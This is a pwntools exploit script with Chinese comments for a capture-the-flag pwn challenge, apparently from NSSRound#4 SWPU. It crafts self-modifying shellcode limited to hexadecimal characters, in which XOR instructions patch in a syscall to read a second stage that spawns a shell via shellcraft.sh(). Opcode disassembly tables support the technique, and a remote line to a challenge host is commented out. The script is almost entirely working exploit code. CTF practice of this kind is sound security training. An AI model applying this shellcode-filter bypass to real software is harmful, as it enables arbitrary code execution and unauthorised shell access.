# [NSSRound#4 SWPU]百密一疏已解决 仅支持16进制数[a-zA-Z0-9]的 shellcode
from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
ls      = lambda data               :log.success(data)
context.arch      = 'amd64'
context.log_level = 'debug'
context.terminal  = ['tmux','splitw','-h','-l','130']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([binary] + argv, *a, **kw)

gdbscript = '''
b *$rebase(0x013EB)
continue
'''.format(**locals())

binary = './pwn1'
libelf = ''

if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)
if (libelf!=''): libc = ELF(libelf)

io = start(binary)
# io = remote('node4.anna.nssctf.cn',28138)


sc = '''
xor    eax, DWORD PTR [rdx+0x34] 
xor    DWORD PTR [rdx+0x30], eax
xor    eax, DWORD PTR [rdx+0x34] 
xor    DWORD PTR [rdx+0x38], eax
'''
sc = asm(sc)
sc += ((0x30 - len(sc)) // 2) * b"\x34\x31"  # 4字节对齐, 16进制字符任意填充
sc += b'\x39\x33' * 2
"""
\x39\x33 ^ '6'(0x36) 后 是 syscall
print(disasm(asm('syscall')))  # 长度 2, 0f 05
  0:   0f 05                   syscall

xor    eax, DWORD PTR [rdx+0x34] , 总长为0x38, rdx+0x34即最后的 '6666' 0x36 * 4, 与 eax 异或, 结果存入 eax
xor    DWORD PTR [rdx+0x30], eax
xor    eax, DWORD PTR [rdx+0x34] 
xor    DWORD PTR [rdx+0x38], eax

a = b'0123456789ABCDEF'
for i in a:
    print(hex(i),chr(i^0xf), chr(i^0x5))
# 0x36 9 3 # -- 得到 0x36 异或后符合16进制数
"""
sc += b'6666'
print('-------', hex(len(sc))) # 0x38
print(disasm(sc))
sl(sc) # syscall read
pause()
sl(len(sc)*b'\x90'+asm(shellcraft.sh()))  # syscall execve
#54 3 9

#   0:   33 42 31                xor    eax, DWORD PTR [rdx+0x31]
#   0:   33 42 32                xor    eax, DWORD PTR [rdx+0x32]
#   0:   33 42 33                xor    eax, DWORD PTR [rdx+0x33]
#   0:   33 42 34                xor    eax, DWORD PTR [rdx+0x34]
#   0:   33 42 35                xor    eax, DWORD PTR [rdx+0x35]
#   0:   33 42 36                xor    eax, DWORD PTR [rdx+0x36]
#   0:   33 42 37                xor    eax, DWORD PTR [rdx+0x37]
#   0:   33 42 38                xor    eax, DWORD PTR [rdx+0x38]
#   0:   33 42 39                xor    eax, DWORD PTR [rdx+0x39]
#   0:   33 42 30                xor    eax, DWORD PTR [rdx+0x30]
#   0:   33 42 41                xor    eax, DWORD PTR [rdx+0x41]
#   0:   33 42 42                xor    eax, DWORD PTR [rdx+0x42]
#   0:   33 42 43                xor    eax, DWORD PTR [rdx+0x43]
#   0:   33 42 44                xor    eax, DWORD PTR [rdx+0x44]
#   0:   33 42 45                xor    eax, DWORD PTR [rdx+0x45]
#   0:   33 42 46                xor    eax, DWORD PTR [rdx+0x46]

#   0:   31 42 31                xor    DWORD PTR [rdx+0x31], eax
#   0:   31 42 32                xor    DWORD PTR [rdx+0x32], eax
#   0:   31 42 33                xor    DWORD PTR [rdx+0x33], eax
#   0:   31 42 34                xor    DWORD PTR [rdx+0x34], eax
#   0:   31 42 35                xor    DWORD PTR [rdx+0x35], eax
#   0:   31 42 36                xor    DWORD PTR [rdx+0x36], eax
#   0:   31 42 37                xor    DWORD PTR [rdx+0x37], eax
#   0:   31 42 38                xor    DWORD PTR [rdx+0x38], eax
#   0:   31 42 39                xor    DWORD PTR [rdx+0x39], eax
#   0:   31 42 30                xor    DWORD PTR [rdx+0x30], eax
#   0:   31 42 41                xor    DWORD PTR [rdx+0x41], eax
#   0:   31 42 42                xor    DWORD PTR [rdx+0x42], eax
#   0:   31 42 43                xor    DWORD PTR [rdx+0x43], eax
#   0:   31 42 44                xor    DWORD PTR [rdx+0x44], eax
#   0:   31 42 45                xor    DWORD PTR [rdx+0x45], eax
#   0:   31 42 46                xor    DWORD PTR [rdx+0x46], eax
#   
#   0:   34 31                   xor    al, 0x31
#   0:   34 32                   xor    al, 0x32
#   0:   34 33                   xor    al, 0x33
#   0:   34 34                   xor    al, 0x34
#   0:   34 35                   xor    al, 0x35
#   0:   34 36                   xor    al, 0x36
#   0:   34 37                   xor    al, 0x37
#   0:   34 38                   xor    al, 0x38
#   0:   34 39                   xor    al, 0x39
#   0:   34 30                   xor    al, 0x30
#   0:   34 41                   xor    al, 0x41
#   0:   34 42                   xor    al, 0x42
#   0:   34 43                   xor    al, 0x43
#   0:   34 44                   xor    al, 0x44
#   0:   34 45                   xor    al, 0x45
#   0:   34 46                   xor    al, 0x46

# 54 3 9



io.interactive()
